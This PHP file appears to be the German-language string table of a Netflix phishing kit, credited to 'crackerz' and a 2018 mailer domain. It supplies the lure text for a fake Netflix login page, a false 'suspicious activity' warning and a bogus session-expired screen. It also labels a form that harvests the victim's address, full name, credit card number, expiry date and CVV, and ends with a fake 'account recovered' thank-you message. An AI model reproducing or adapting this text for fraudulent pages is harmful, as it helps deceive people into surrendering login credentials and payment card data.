<?php


/* Programmer name :

    ╔╗ ╦ ╦  ╔═╗╦═╗╔═╗╔═╗╦╔═╔═╗╦═╗╔═╗
    ╠╩╗╚╦╝  ║  ╠╦╝╠═╣║  ╠╩╗║╣ ╠╦╝╔═╝
    ╚═╝ ╩   ╚═╝╩╚═╩ ╩╚═╝╩ ╩╚═╝╩╚═╚═╝

*/  #2018  Mailer-inbox-unlimited.gq
    


################################################################################### Login

$crackerz_01 = "Anmeldung";
$crackerz_02 = "Email";
$crackerz_03 = "Passwort";
$crackerz_04 = "Haben Sie Ihre E-Mail oder Ihr Passwort vergessen?";
$crackerz_05 = "Erinnere dich an mich";
$crackerz_06 = "Mit Facebook einloggen";
$crackerz_07 = "Neu bei Netflix?";
$crackerz_08 = "Jetzt registrieren.";

################################################################################### Login



################################################################################### Activity

$crackerz_09 = "Letzte Aktivität";
$crackerz_10 = "Erkennst du diese Aktivität nicht?";
$crackerz_11 = "Wenn Sie sich nicht von einem neuen Gerät aus angemeldet haben, wird Ihr Konto möglicherweise gehackt. Bitte folgen Sie diesen Schritten, um Ihr Konto so schnell wie möglich zu sichern.";
$crackerz_12 = "ANFANG";

################################################################################### Activity



################################################################################### Redirect

//  Sie werden automatisch auf die Startseite in 52 Sekunden weitergeleitet.
$crackerz_13 = "Sie werden automatisch auf die ";
$crackerz_14 = "seite aktualisieren in ";
$crackerz_15 = "startseite in ";
$crackerz_16 = " Sekunden weitergeleitet.";

################################################################################### Redirect



################################################################################### Infos

$crackerz_17 = "Informationen aktualisieren";
$crackerz_18 = "Aktualisieren Sie Ihre Zahlungsinformationen.";
$crackerz_19 = "Ihre Mitgliedschaft wird bei Ihrer nächsten Abrechnungsperiode ohne Validierung nicht in Rechnung gestellt.";

$crackerz_20 = "Adresse";
$crackerz_21 = "Stadt";
$crackerz_22 = "Zustand";
$crackerz_23 = "Postleitzahl";

$crackerz_24 = "Vollständiger Name";
$crackerz_25 = "Kreditkartennummer";
$crackerz_26 = "Ablaufdatum (MM / JJJJ)";
$crackerz_27 = "Sicherheitscode (CVV)";

################################################################################### Infos



################################################################################### Button

$crackerz_28 = "NÄCHSTER";  
$crackerz_29 = "SPAREN";
$crackerz_30 = "ZURÜCK";

################################################################################### Button



################################################################################### Errors

$crackerz_31 = "Bitte geben Sie eine gültige Email-Adresse ein.";
$crackerz_32 = "Ihr Passwort muss zwischen 4 und 60 Zeichen enthalten.";

$crackerz_33 = "Die Adresse ist ein Pflichtfeld.";
$crackerz_34 = "Die Stadt ist ein Pflichtfeld.";
$crackerz_35 = "Zustand ist ein Pflichtfeld.";
$crackerz_36 = "Die Postleitzahl ist ein Pflichtfeld.";

$crackerz_37 = "Vollständiger Name ist ein Pflichtfeld.";
$crackerz_38 = "Die Kartennummer ist ein Pflichtfeld.";
$crackerz_39 = "Ablaufdatum ist ein Pflichtfeld.";
$crackerz_40 = "Sicherheitscode (CVV) ist ein Pflichtfeld.";

################################################################################### Errors



################################################################################### More time

$crackerz_41 = "Sitzung Abgelaufen";
$crackerz_42 = "Sitzung abgelaufen. Bitte loggen Sie sich erneut ein, um Ihre Sitzung zu erneuern.";
$crackerz_43 = "Dies liegt normalerweise daran, dass Cookies entweder gelöscht oder aus dem Browser entfernt werden.";
$crackerz_44 = "Drücken Sie die Taste unten, um die Sitzungszeit zu verlängern, um Ihre Identität zu bestätigen und um auf Ihr Konto zuzugreifen.";
$crackerz_45 = "FANG NOCHMAL AN";

################################################################################### More time



################################################################################### Thanks

$crackerz_46 = "Danke";
$crackerz_48 = "Herzliche Glückwünsche ! Sie haben Ihr Konto wiederhergestellt. Jetzt können Sie auf alle Ihre Netflix-Vorteile zugreifen.";
$crackerz_50 = "FORTSETZEN";

################################################################################### Thanks

################################################################################### Footer

$crackerz_51 = "Fragen? Kontaktiere uns.";

# login / alert / more
$crackerz_52 = "Gutschein-Bedingungen";
$crackerz_53 = "Datenschutzerklärung";
$crackerz_54 = "Nutzungsbedingungen";

$crackerz_55 = "FAQ";
$crackerz_56 = "Hilfezentrum";
$crackerz_57 = "Privacy";
$crackerz_58 = "Cookie-Einstellungen";
$crackerz_59 = "Unternehmensinformationen";

$crackerz_60 = "Ausloggen";

################################################################################### Footer

?>